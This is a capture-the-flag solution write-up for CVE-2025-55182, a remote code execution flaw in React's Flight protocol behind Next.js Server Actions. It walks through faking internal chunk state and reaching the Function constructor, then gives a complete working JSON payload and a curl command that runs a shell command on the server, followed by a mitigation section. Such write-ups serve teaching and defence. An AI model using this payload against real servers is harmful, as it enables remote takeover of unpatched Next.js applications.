# React2Shell CTF - Solution Writeup

## Challenge Summary

This challenge exploits CVE-2025-55182, a critical Remote Code Execution vulnerability in React's Flight protocol, used by Next.js Server Components and Server Actions.

## Vulnerability Background

### What is React Flight?

Flight is React's serialization protocol for Server Components. It allows the server to stream complex data structures to the client, including:

- Regular JSON data
- References between objects (`$1`, `$2`)
- Promises that resolve later (`$@1`)
- Lazy components (`$L1`)
- Blobs (`$B`)

### The Bug

The vulnerability has two parts:

1. **No validation of internal state**: Flight uses internal objects to track chunk status (pending, resolved, etc.). An attacker can craft objects that look like this internal state, and Flight trusts them.

2. **No `hasOwnProperty` checks**: Flight's reference syntax (`$1:prop:prop2`) traverses properties without checking if they're own properties or inherited from prototypes.

## Exploitation Steps

### Step 1: Force Promise Handling

We need Flight to call `.then()` on our controlled object. We do this by sending:

```javascript
"1": "$@0"
```

This tells Flight "chunk 1 is a Promise pointing to chunk 0." Flight will create an internal Promise wrapper and eventually await our chunk.

### Step 2: Fake Internal State

Chunk 0 is crafted to look like Flight's internal chunk object:

```javascript
"0": {
  status: "resolved_model",
  // ... other fields
}
```

When Flight sees `status: "resolved_model"`, it thinks this is its own internal tracking object and trusts the `value` field.

### Step 3: Trigger Blob Handling

The `value` field contains:

```javascript
value: '{"then":"$B"}'
```

The `$B` tells Flight "this is a Blob." To fetch a Blob, Flight runs:

```javascript
const blob = response._formData.get(response._prefix + blobId);
```

### Step 4: Hijack _response

We control `_response` because Flight trusted our fake chunk:

```javascript
_response: {
  _prefix: "require('child_process').execSync('cat /flag.txt').toString()//",
  _formData: {
    get: "$1:then:constructor"
  }
}
```

### Step 5: Reach Function Constructor

The reference `$1:then:constructor` traverses:

1. `$1` → Chunk 1 (Flight's internal Promise wrapper)
2. `:then` → The `.then` method (a real JavaScript function)
3. `:constructor` → `Function` (every function's constructor)

Flight doesn't check `hasOwnProperty`, so it happily walks up the prototype chain.

### Step 6: Code Execution

Flight now calls:

```javascript
Function("require('child_process').execSync('cat /flag.txt').toString()//B")
```

The `//` comments out the trailing "B", making valid JavaScript. The function executes our code.

## Complete Payload

```javascript
{
  "0": {
    "status": "resolved_model",
    "reason": 0,
    "_response": {
      "_prefix": "require('child_process').execSync('cat /flag.txt').toString()//",
      "_formData": {
        "get": "$1:then:constructor"
      }
    },
    "then": "$1:then",
    "value": "{\"then\":\"$B\"}"
  },
  "1": "$@0"
}
```

## Sending the Exploit

The payload is sent as multipart form data to any Server Action endpoint:

```bash
curl -X POST http://localhost:3000 \
  -H "Content-Type: multipart/form-data" \
  -H "Accept: text/x-component" \
  -F "0={...chunk0...}" \
  -F "1=\$@0"
```

## Flag

```
FLAG{r34ct_fl1ght_t0_rc3_2025}
```

## Mitigation

The fix adds `hasOwnProperty` checks before traversing properties:

```javascript
if (!Object.hasOwnProperty.call(obj, property)) {
  throw new Error("Invalid property access");
}
```

This prevents accessing inherited properties like `constructor`.

## Lessons Learned

1. **Never trust user input** - even if it "looks like" internal data
2. **Use hasOwnProperty** - when traversing user-controlled property paths
3. **Validate data direction** - clients shouldn't send Promise references
4. **Defense in depth** - WAFs can help detect exploit patterns

## References

- CVE-2025-55182
- Original researcher: Lachlan Davidson
- First public PoC: @maple3142 (30 hours post-patch)
